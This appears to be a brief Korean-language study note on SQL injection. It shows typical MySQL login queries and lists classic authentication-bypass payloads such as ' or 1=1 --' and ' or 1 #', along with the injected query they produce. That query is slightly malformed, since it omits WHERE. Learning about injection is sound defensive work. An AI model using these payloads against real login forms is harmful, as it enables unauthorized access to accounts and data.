# GENERAL SQL injection
<br><br><br><br>
> ( ) <- 강조 ( ) 기호는 제외

<br><br><br><br>

__Mysql 대표적인 login query__
***

~~~~sql

SELECT * FROM member WHERE userId = 'input id' and userPw = 'input pw';

-> 입력받은 id , pw 체크

SELECT * FROM member WHERE userId = 'input id';

-> 입력받은 id 만 체크한 후 서버 파일에서 입력받은 id 와 Mysql 결과의 비밀번호와 비교

~~~~
<br><br><br>

__Mysql Login Sql injection__
***

~~~~sql

' or 1=1 --'
' or 1 #'
'
입력 결과

SELECT * FROM member userId = '' or 1=1 --'' and userPw = '';

-> 1=1 or 1 참이 되는 값
~~~~
<br><br>
